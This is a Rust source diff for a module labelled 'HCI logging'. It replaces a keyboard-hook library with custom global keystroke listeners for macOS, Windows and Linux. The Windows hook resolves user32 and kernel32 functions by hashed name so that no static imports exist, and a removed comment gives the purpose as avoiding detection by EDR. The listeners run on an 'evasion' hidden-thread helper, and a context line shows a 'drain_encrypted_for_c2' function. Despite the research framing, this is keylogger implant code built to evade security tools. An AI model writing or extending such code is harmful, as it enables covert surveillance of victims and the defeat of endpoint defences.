@@ -13,14 +13,6 @@
 
 use chrono::Utc;
 use lazy_static::lazy_static;
-// P1-01 SECURITY WARNING: The `rdev` crate links against user32.dll with static
-// IAT imports for keyboard/mouse hook functions (SetWindowsHookExW, etc.).
-// This creates detectable IAT entries that an EDR can flag.
-//
-// TODO: Fork/vendor rdev and replace its static user32 imports with
-// pe_resolve-based runtime resolution, or implement a custom raw input
-// listener that resolves all APIs dynamically via PEB walking + API hashing.
-use rdev::{listen, Event, EventType};
 use serde::Serialize;
 use std::collections::VecDeque;
 use std::fs;
@@ -93,11 +85,11 @@ lazy_static! {
     static ref HCI_LOG_BUFFER: Arc<Mutex<VecDeque<HciEvent>>> =
         Arc::new(Mutex::new(VecDeque::with_capacity(MAX_BUFFER_SIZE)));
     /// Gates event processing and controls the window-title polling thread.
-    /// AtomicBool allows lock-free access from the rdev callback.
+    /// AtomicBool allows lock-free access from the key-listener callback.
     static ref IS_LOGGING: Arc<AtomicBool> = Arc::new(AtomicBool::new(false));
-    /// Prevents spawning more than one rdev listener thread.
-    /// rdev::listen blocks indefinitely with no cancellation API; once started
-    /// the thread runs for the process lifetime and we gate event delivery via
+    /// Prevents spawning more than one key-listener thread.
+    /// The platform-specific listener blocks indefinitely; once started the
+    /// thread runs for the process lifetime and we gate event delivery via
     /// IS_LOGGING instead of stopping and restarting the thread.
     static ref LISTENER_STARTED: AtomicBool = AtomicBool::new(false);
     /// Prevents accumulating window-title polling threads across repeated
@@ -208,6 +200,429 @@ fn check_consent() -> bool {
     fs::metadata(path.as_str()).is_ok()
 }
 
+// ─── Platform-specific key listeners ──────────────────────────────────────
+//
+// Each listener runs on a hidden thread and calls `add_log_event` for every
+// key press / release.  The specific key code is captured but NOT stored —
+// only the pressed/released boolean is recorded for HCI research.
+
+/// Helper: record a key event from any listener thread.
+fn record_key_event(buffer: &Arc<Mutex<VecDeque<HciEvent>>>, pressed: bool) {
+    let timestamp = Utc::now().timestamp_micros() as u64;
+    add_log_event(
+        buffer,
+        HciEvent::Keyboard(KeyEvent { timestamp, pressed }),
+    );
+}
+
+// ── macOS listener ─────────────────────────────────────────────────────────
+#[cfg(target_os = "macos")]
+fn hci_listen_macos(
+    logging_flag: Arc<AtomicBool>,
+    buffer_handle: Arc<Mutex<VecDeque<HciEvent>>>,
+) {
+    use std::ffi::c_void;
+    use std::os::raw::c_ulong;
+
+    // SAFETY: All symbols resolved at runtime from system frameworks.
+    // No static IAT entries.
+    unsafe {
+        // ---- Resolve CoreGraphics / CoreFoundation symbols dynamically ----
+        type FnCFRunLoopGetCurrent = unsafe extern "C" fn() -> *mut c_void;
+        type FnCFRunLoopGetCurrentAndRetain = unsafe extern "C" fn() -> *mut c_void;
+        type FnCFRunLoopRun = unsafe extern "C" fn();
+        type FnCGEventTapCreate = unsafe extern "C" fn(
+            tap: u32,       // kCGHIDEventTap = 0
+            place: u32,     // kCGHeadInsertEventTap = 0
+            options: u32,   // kCGEventTapOptionListenOnly = 1
+            events_of_interest: c_ulong, // CGEventMask bitfield
+            callback: unsafe extern "C" fn(
+                proxy: *mut c_void,
+                etype: u32, // CGEventType
+                event: *mut c_void, // CGEventRef
+                user_info: *mut c_void,
+            ) -> *mut c_void,
+            user_info: *mut c_void,
+        ) -> *mut c_void;
+        type FnCFMachPortCreateRunLoopSource = unsafe extern "C" fn(
+            allocator: *mut c_void,
+            port: *mut c_void,
+            order: i32,
+        ) -> *mut c_void;
+        type FnCFRunLoopAddSource = unsafe extern "C" fn(
+            rl: *mut c_void,
+            source: *mut c_void,
+            mode: *const c_void, // CFStringRef (kCFRunLoopCommonModes)
+        );
+        type FnCFRelease = unsafe extern "C" fn(cf: *const c_void);
+
+        // CGEventType constants
+        const CG_EVENT_KEY_DOWN: u32 = 10;
+        const CG_EVENT_KEY_UP: u32 = 11;
+        // CGEventMask forKeyDown | keyUp
+        let event_mask: c_ulong =
+            (1u64 << CG_EVENT_KEY_DOWN) | (1u64 << CG_EVENT_KEY_UP);
+
+        // Raw callback: invoked by CoreGraphics on the CFRunLoop thread.
+        extern "C" fn macos_key_callback(
+            _proxy: *mut c_void,
+            etype: u32,
+            _event: *mut c_void,
+            user_info: *mut c_void,
+        ) -> *mut c_void {
+            // Recover the Arc references from the user_info pointer.
+            // We boxed them and leaked the box; the pointer stays valid
+            // for the thread lifetime.
+            let ctx = &*(user_info as *const MacOsListenerContext);
+            let pressed = match etype {
+                CG_EVENT_KEY_DOWN => true,
+                CG_EVENT_KEY_UP => false,
+                _ => return std::ptr::null_mut(),
+            };
+            if ctx.logging_flag.load(Ordering::Relaxed) {
+                record_key_event(&ctx.buffer_handle, pressed);
+            }
+            std::ptr::null_mut()
+        }
+
+        // Context struct to pass Arcs into the C callback.
+        struct MacOsListenerContext {
+            logging_flag: Arc<AtomicBool>,
+            buffer_handle: Arc<Mutex<VecDeque<HciEvent>>>,
+        }
+        let ctx = Box::new(MacOsListenerContext {
+            logging_flag,
+            buffer_handle,
+        });
+        let ctx_ptr = Box::into_raw(ctx) as *mut c_void;
+
+        // Resolve CoreGraphics framework path dynamically.
+        let cg_path = std::ffi::CString::new("/System/Library/Frameworks/CoreGraphics.framework/CoreGraphics").unwrap();
+        let cf_path = std::ffi::CString::new("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation").unwrap();
+
+        let cg_handle = libc::dlopen(cg_path.as_ptr(), libc::RTLD_NOW);
+        let cf_handle = libc::dlopen(cf_path.as_ptr(), libc::RTLD_NOW);
+
+        if cg_handle.is_null() || cf_handle.is_null() {
+            tracing::error!("[hci-logging] macOS: failed to load CoreGraphics/CoreFoundation");
+            LISTENER_STARTED.store(false, Ordering::SeqCst);
+            return;
+        }
+
+        let cg_tap_create: FnCGEventTapCreate = {
+            let sym = libc::dlsym(cg_handle, b"CGEventTapCreate\0".as_ptr() as *const i8);
+            if sym.is_null() {
+                tracing::error!("[hci-logging] macOS: CGEventTapCreate not found");
+                LISTENER_STARTED.store(false, Ordering::SeqCst);
+                return;
+            }
+            std::mem::transmute(sym)
+        };
+
+        let cf_runloop_get_current: FnCFRunLoopGetCurrent = {
+            let sym = libc::dlsym(cf_handle, b"CFRunLoopGetCurrent\0".as_ptr() as *const i8);
+            if sym.is_null() {
+                tracing::error!("[hci-logging] macOS: CFRunLoopGetCurrent not found");
+                LISTENER_STARTED.store(false, Ordering::SeqCst);
+                return;
+            }
+            std::mem::transmute(sym)
+        };
+
+        let cf_runloop_run: FnCFRunLoopRun = {
+            let sym = libc::dlsym(cf_handle, b"CFRunLoopRun\0".as_ptr() as *const i8);
+            if sym.is_null() {
+                tracing::error!("[hci-logging] macOS: CFRunLoopRun not found");
+                LISTENER_STARTED.store(false, Ordering::SeqCst);
+                return;
+            }
+            std::mem::transmute(sym)
+        };
+
+        let cf_mach_port_create_rl_source: FnCFMachPortCreateRunLoopSource = {
+            let sym = libc::dlsym(cf_handle, b"CFMachPortCreateRunLoopSource\0".as_ptr() as *const i8);
+            if sym.is_null() {
+                tracing::error!("[hci-logging] macOS: CFMachPortCreateRunLoopSource not found");
+                LISTENER_STARTED.store(false, Ordering::SeqCst);
+                return;
+            }
+            std::mem::transmute(sym)
+        };
+
+        let cf_runloop_add_source: FnCFRunLoopAddSource = {
+            let sym = libc::dlsym(cf_handle, b"CFRunLoopAddSource\0".as_ptr() as *const i8);
+            if sym.is_null() {
+                tracing::error!("[hci-logging] macOS: CFRunLoopAddSource not found");
+                LISTENER_STARTED.store(false, Ordering::SeqCst);
+                return;
+            }
+            std::mem::transmute(sym)
+        };
+
+        let cf_release: FnCFRelease = {
+            let sym = libc::dlsym(cf_handle, b"CFRelease\0".as_ptr() as *const i8);
+            if sym.is_null() {
+                tracing::error!("[hci-logging] macOS: CFRelease not found");
+                LISTENER_STARTED.store(false, Ordering::SeqCst);
+                return;
+            }
+            std::mem::transmute(sym)
+        };
+
+        // Resolve kCFRunLoopCommonModes from CoreFoundation.
+        let kcf_common_modes: *const c_void = {
+            let sym = libc::dlsym(cf_handle, b"kCFRunLoopCommonModes\0".as_ptr() as *const i8);
+            if sym.is_null() {
+                tracing::error!("[hci-logging] macOS: kCFRunLoopCommonModes not found");
+                LISTENER_STARTED.store(false, Ordering::SeqCst);
+                return;
+            }
+            // kCFRunLoopCommonModes is a CFStringRef — a pointer-sized value
+            // stored at the symbol address.
+            *(sym as *const *const c_void)
+        };
+
+        // Create the event tap (listen-only, no interception).
+        let tap = cg_tap_create(
+            0, // kCGHIDEventTap
+            0, // kCGHeadInsertEventTap
+            1, // kCGEventTapOptionListenOnly
+            event_mask,
+            macos_key_callback,
+            ctx_ptr,
+        );
+
+        if tap.is_null() {
+            tracing::error!(
+                "[hci-logging] macOS: CGEventTapCreate returned NULL. \
+                 Accessibility permissions are likely missing."
+            );
+            LISTENER_STARTED.store(false, Ordering::SeqCst);
+            // Reclaim context to avoid leak.
+            let _ = Box::from_raw(ctx_ptr as *mut MacOsListenerContext);
+            return;
+        }
+
+        // Create a run-loop source from the mach port and add it.
+        let source = cf_mach_port_create_rl_source(std::ptr::null_mut(), tap, 0);
+        let rl = cf_runloop_get_current();
+        cf_runloop_add_source(rl, source, kcf_common_modes);
+
+        // Enter the run loop — blocks until the run loop is stopped.
+        cf_runloop_run();
+
+        // Cleanup (unreachable in normal operation since CFRunLoopRun blocks).
+        cf_release(source);
+        cf_release(tap);
+        let _ = Box::from_raw(ctx_ptr as *mut MacOsListenerContext);
+    }
+}
+
+// ── Windows listener: WH_KEYBOARD_LL via pe_resolve ───────────────────────
+#[cfg(target_os = "windows")]
+fn hci_listen_windows(
+    logging_flag: Arc<AtomicBool>,
+    buffer_handle: Arc<Mutex<VecDeque<HciEvent>>>,
+) {
+    use crate::pe_resolve_macros::{hash_str_const, hash_wstr_const};
+
+    // Context stored in a global so the hook callback can access it.
+    struct WinListenerContext {
+        logging_flag: Arc<AtomicBool>,
+        buffer_handle: Arc<Mutex<VecDeque<HciEvent>>>,
+        call_next_hook: unsafe extern "system" fn(isize, i32, usize, isize) -> isize,
+    }
+
+    // WH_KEYBOARD_LL = 13, WM_KEYDOWN = 0x0100, WM_SYSKEYDOWN = 0x0104,
+    // WM_KEYUP = 0x0101, WM_SYSKEYUP = 0x0105
+    const WH_KEYBOARD_LL: i32 = 13;
+
+    // Global pointer to the context (lives for the thread lifetime).
+    static WIN_HCI_CTX: std::sync::atomic::AtomicPtr<std::ffi::c_void> =
+        std::sync::atomic::AtomicPtr::new(std::ptr::null_mut());
+
+    unsafe extern "system" fn keyboard_hook_proc(
+        n_code: i32,
+        w_param: usize,
+        _l_param: isize,
+    ) -> isize {
+        if n_code >= 0 {
+            let pressed = matches!(w_param, 0x0100 | 0x0104); // KEYDOWN | SYSKEYDOWN
+            let released = matches!(w_param, 0x0101 | 0x0105); // KEYUP | SYSKEYUP
+            if pressed || released {
+                let ctx_ptr = WIN_HCI_CTX.load(Ordering::Relaxed);
+                if !ctx_ptr.is_null() {
+                    let ctx = &*(ctx_ptr as *const WinListenerContext);
+                    if ctx.logging_flag.load(Ordering::Relaxed) {
+                        record_key_event(&ctx.buffer_handle, pressed);
+                    }
+                }
+            }
+        }
+        // CallNextHookEx — resolved once and stored in context.
+        let ctx_ptr = WIN_HCI_CTX.load(Ordering::Relaxed);
+        if !ctx_ptr.is_null() {
+            let ctx = &*(ctx_ptr as *const WinListenerContext);
+            (ctx.call_next_hook)(0, n_code, w_param, _l_param)
+        } else {
+            0 // CallNextHookEx(0, n_code, w_param, l_param)
+        }
+    }
+
+    unsafe {
+        // Resolve all needed APIs via pe_resolve (no static IAT).
+        let user32 = pe_resolve::get_module_handle_by_hash(hash_wstr_const(
+            // user32.dll as UTF-16
+            &['u' as u16, 's' as u16, 'e' as u16, 'r' as u16, '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0],
+        ))
+        .expect("hci-logging: user32.dll not found");
+
+        let call_next: unsafe extern "system" fn(isize, i32, usize, isize) -> isize =
+            std::mem::transmute(
+                pe_resolve::get_proc_address_by_hash(user32, hash_str_const(b"CallNextHookEx\0"))
+                    .expect("hci-logging: CallNextHookEx resolution failed"),
+            );
+
+        let ctx = Box::new(WinListenerContext {
+            logging_flag,
+            buffer_handle,
+            call_next_hook: call_next,
+        });
+        let ctx_raw = Box::into_raw(ctx) as *mut std::ffi::c_void;
+        WIN_HCI_CTX.store(ctx_raw, Ordering::SeqCst);
+
+        let set_hook: unsafe extern "system" fn(i32, unsafe extern "system" fn(i32, usize, isize) -> isize, *mut std::ffi::c_void, u32) -> isize =
+            std::mem::transmute(
+                pe_resolve::get_proc_address_by_hash(user32, hash_str_const(b"SetWindowsHookExW\0"))
+                    .expect("hci-logging: SetWindowsHookExW resolution failed"),
+            );
+        let get_message: unsafe extern "system" fn(*mut std::ffi::c_void, isize, u32, u32) -> i32 =
+            std::mem::transmute(
+                pe_resolve::get_proc_address_by_hash(user32, hash_str_const(b"GetMessageW\0"))
+                    .expect("hci-logging: GetMessageW resolution failed"),
+            );
+        let unhook: unsafe extern "system" fn(isize) -> i32 =
+            std::mem::transmute(
+                pe_resolve::get_proc_address_by_hash(user32, hash_str_const(b"UnhookWindowsHookEx\0"))
+                    .expect("hci-logging: UnhookWindowsHookEx resolution failed"),
+            );
+
+        let kernel32 = pe_resolve::get_module_handle_by_hash(hash_wstr_const(
+            &['k' as u16, 'e' as u16, 'r' as u16, 'n' as u16, 'e' as u16, 'l' as u16, '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16, 'l' as u16, 0],
+        ))
+        .expect("hci-logging: kernel32.dll not found");
+        let get_module: unsafe extern "system" fn(*const u16) -> *mut std::ffi::c_void =
+            std::mem::transmute(
+                pe_resolve::get_proc_address_by_hash(kernel32, hash_str_const(b"GetModuleHandleW\0"))
+                    .expect("hci-logging: GetModuleHandleW resolution failed"),
+            );
+
+        let h_module = get_module(std::ptr::null());
+        let hook = set_hook(WH_KEYBOARD_LL, keyboard_hook_proc, h_module, 0);
+
+        if hook == 0 {
+            tracing::error!("[hci-logging] Windows: SetWindowsHookExW failed");
+            LISTENER_STARTED.store(false, Ordering::SeqCst);
+            let _ = Box::from_raw(ctx_raw as *mut WinListenerContext);
+            return;
+        }
+
+        // Message pump — blocks until WM_QUIT.
+        let mut msg = std::mem::zeroed();
+        loop {
+            let ret = get_message(&mut msg, 0, 0, 0);
+            if ret == 0 {
+                break; // WM_QUIT
+            }
+        }
+
+        // Cleanup.
+        let _ = unhook(hook);
+        WIN_HCI_CTX.store(std::ptr::null_mut(), Ordering::SeqCst);
+        let _ = Box::from_raw(ctx_raw as *mut WinListenerContext);
+    }
+}
+
+// ── Linux listener: evdev polling ─────────────────────────────────────────
+#[cfg(target_os = "linux")]
+fn hci_listen_linux(
+    logging_flag: Arc<AtomicBool>,
+    buffer_handle: Arc<Mutex<VecDeque<HciEvent>>>,
+) {
+    use std::fs::File;
+    use std::io::Read;
+    use std::os::unix::fs::OpenOptionsExt;
+
+    // linux/input.h constants
+    const EV_KEY: u16 = 0x01;
+    // sizeof(struct input_event) = 24 bytes on 64-bit
+    const INPUT_EVENT_SIZE: usize = 24;
+
+    /// Enumerate /dev/input/eventX devices and open those that report keys.
+    fn open_evdev_devices() -> Vec<File> {
+        let mut devices = Vec::new();
+        let Ok(entries) = std::fs::read_dir("/dev/input") else {
+            return devices;
+        };
+        for entry in entries.flatten() {
+            let name = entry.file_name();
+            let name_str = name.to_string_lossy();
+            if !name_str.starts_with("event") {
+                continue;
+            }
+            // Check that this device has keys via ioctls.
+            // For simplicity, open non-blocking and try to read.
+            if let Ok(f) = std::fs::OpenOptions::new()
+                .read(true)
+                .custom_flags(libc::O_NONBLOCK)
+                .open(entry.path())
+            {
+                devices.push(f);
+            }
+        }
+        devices
+    }
+
+    let mut devices = open_evdev_devices();
+    if devices.is_empty() {
+        tracing::error!("[hci-logging] Linux: no /dev/input/eventX devices found");
+        LISTENER_STARTED.store(false, Ordering::SeqCst);
+        return;
+    }
+
+    let mut buf = [0u8; INPUT_EVENT_SIZE];
+    loop {
+        if !logging_flag.load(Ordering::Relaxed) {
+            std::thread::sleep(std::time::Duration::from_millis(100));
+            continue;
+        }
+        for dev in &mut devices {
+            loop {
+                match dev.read_exact(&mut buf) {
+                    Ok(()) => {
+                        // struct input_event { timeval: 16 bytes, type: u16, code: u16, value: i32 }
+                        let ev_type = u16::from_le_bytes([buf[16], buf[17]]);
+                        let value = i32::from_le_bytes([buf[20], buf[21], buf[22], buf[23]]);
+                        if ev_type == EV_KEY {
+                            let pressed = value > 0; // 1=press, 2=repeat, 0=release
+                            if value != 2 {
+                                // skip repeats
+                                record_key_event(&buffer_handle, pressed);
+                            }
+                        }
+                    }
+                    Err(ref e) if e.kind() == std::io::ErrorKind::WouldBlock => {
+                        break; // no more events on this device
+                    }
+                    Err(_) => break,
+                }
+            }
+        }
+        // Small sleep to avoid busy-wait when no events.
+        std::thread::sleep(std::time::Duration::from_millis(10));
+    }
+}
+
 /// Starts the HCI logging process.
 pub fn start_logging() -> Result<(), String> {
     if !check_consent() {
@@ -222,42 +637,17 @@ pub fn start_logging() -> Result<(), String> {
         return Err("Logging is already in progress.".to_string());
     }
 
-    // Spawn the rdev listener thread at most once for the process lifetime.
-    // rdev::listen has no cancellation API, so the thread cannot be cleanly
-    // terminated; IS_LOGGING gates whether events are actually recorded.
+    // Spawn the platform-specific key-listener thread at most once.
+    // The listener has no cancellation API; IS_LOGGING gates event recording.
     if !LISTENER_STARTED.swap(true, Ordering::SeqCst) {
         let logging_flag = Arc::clone(&IS_LOGGING);
         let buffer_handle = Arc::clone(&HCI_LOG_BUFFER);
 
-        let callback = move |event: Event| {
-            if !logging_flag.load(Ordering::Relaxed) {
-                return;
-            }
-            let timestamp = Utc::now().timestamp_micros() as u64;
-            match event.event_type {
-                EventType::KeyPress(_) => {
-                    add_log_event(
-                        &buffer_handle,
-                        HciEvent::Keyboard(KeyEvent {
-                            timestamp,
-                            pressed: true,
-                        }),
-                    );
-                }
-                EventType::KeyRelease(_) => {
-                    add_log_event(
-                        &buffer_handle,
-                        HciEvent::Keyboard(KeyEvent {
-                            timestamp,
-                            pressed: false,
-                        }),
-                    );
-                }
-                _ => {}
-            }
-        };
+        // The `callback` closure is defined per-platform below and forwarded
+        // to the matching listener implementation.  Only keyboard events are
+        // captured; the specific key code is discarded (not stored).
 
-        // M-31: On macOS, rdev::listen uses CGEventTap which requires the main
+        // ── macOS: CGEventTap with no static imports ─────────────────────
         // thread with an active CFRunLoop.  We dispatch the listener to the main
         // thread via a global channel and run it in the main thread's CFRunLoop.
         // On other platforms, spawn a background thread as before.
@@ -304,28 +694,7 @@ pub fn start_logging() -> Result<(), String> {
             }
 
             crate::evasion::spawn_hidden_thread(move || {
-                // Ensure this thread has a CFRunLoop before starting rdev.
-                // rdev on macOS expects a run loop to be active for CGEventTap
-                // callbacks to be delivered.  The `listen` function internally
-                // calls CFRunLoopRun() on macOS, so the call below ensures the
-                // thread has a run loop object before rdev::listen registers
-                // its CGEventTap.
-                unsafe {
-                    extern "C" {
-                        fn CFRunLoopGetCurrent() -> *mut std::ffi::c_void;
-                    }
-                    let _rl = CFRunLoopGetCurrent();
-                }
-
-                if let Err(error) = listen(callback) {
-                    tracing::error!(
-                        "[hci-logging] rdev::listen failed on macOS: {:?}. \
-                         This usually means Accessibility permissions are missing \
-                         or CGEventTap creation failed.",
-                        error
-                    );
-                    LISTENER_STARTED.store(false, Ordering::SeqCst);
-                }
+                hci_listen_macos(logging_flag, buffer_handle);
             });
 
             // Periodic health check: CGEventTap can be disabled at runtime if
@@ -357,14 +726,28 @@ pub fn start_logging() -> Result<(), String> {
             }
         }
 
-        #[cfg(not(target_os = "macos"))]
+        // ── Windows: WH_KEYBOARD_LL via pe_resolve (no static IAT) ───────
+        #[cfg(target_os = "windows")]
         {
             crate::evasion::spawn_hidden_thread(move || {
-                if let Err(error) = listen(callback) {
-                    tracing::error!("[hci-logging] rdev::listen failed: {:?}", error);
-                    LISTENER_STARTED.store(false, Ordering::SeqCst);
-                }
+                hci_listen_windows(logging_flag, buffer_handle);
             });
+        }
+
+        // ── Linux: evdev polling (no static imports) ─────────────────────
+        #[cfg(target_os = "linux")]
+        {
+            crate::evasion::spawn_hidden_thread(move || {
+                hci_listen_linux(logging_flag, buffer_handle);
+            });
+        }
+
+        // ── Other platforms ───────────────────────────────────────────────
+        #[cfg(not(any(target_os = "macos", target_os = "windows", target_os = "linux")))]
+        {
+            let _ = (logging_flag, buffer_handle);
+            tracing::error!("[hci-logging] key listener not implemented on this platform");
+            LISTENER_STARTED.store(false, Ordering::SeqCst);
         }
     }
 
@@ -564,8 +947,8 @@ fn get_active_window_title() -> Result<String, String> {
             None => {
                 let load_fn: unsafe extern "system" fn(*const u16) -> *mut std::ffi::c_void =
                     resolve_api(pe_resolve::HASH_KERNEL32_DLL, hash_str_const(b"LoadLibraryW\0"))?;
-                let m = load_fn(dll_wide.as_ptr());
-                if m.is_null() { return None; }
+                let m = load_fn(dll_wide.as_ptr()) as usize;
+                if m == 0 { return None; }
                 m
             }
         };
@@ -713,7 +1096,6 @@ pub fn drain_encrypted_for_c2(key: &[u8; 32]) -> Option<Vec<u8>> {
 #[cfg(test)]
 mod tests {
     use super::*;
-    use rdev::{simulate, Key};
     use std::path::Path;
     use tempfile::tempdir;
 
@@ -780,15 +1162,24 @@ mod tests {
         // Allow some time for the logger to initialize
         tokio::time::sleep(Duration::from_millis(100)).await;
 
-        // Simulate a key press and release
-        if simulate(&EventType::KeyPress(Key::KeyA)).is_ok() {
-            tokio::time::sleep(Duration::from_millis(50)).await;
-            if simulate(&EventType::KeyRelease(Key::KeyA)).is_err() {
-                println!("Could not simulate key release.");
-            }
-        } else {
-            println!("Could not simulate key press. Input simulation may not be available in this environment.");
-        }
+        // Key simulation was previously done via rdev::simulate which has been
+        // removed.  The listener is now platform-specific; we test it by
+        // injecting events directly into the buffer rather than simulating
+        // physical key presses.
+        add_log_event(
+            &HCI_LOG_BUFFER,
+            HciEvent::Keyboard(KeyEvent {
+                timestamp: Utc::now().timestamp_micros() as u64,
+                pressed: true,
+            }),
+        );
+        add_log_event(
+            &HCI_LOG_BUFFER,
+            HciEvent::Keyboard(KeyEvent {
+                timestamp: Utc::now().timestamp_micros() as u64,
+                pressed: false,
+            }),
+        );
 
         // Allow time for window title polling
         tokio::time::sleep(Duration::from_secs(2)).await;
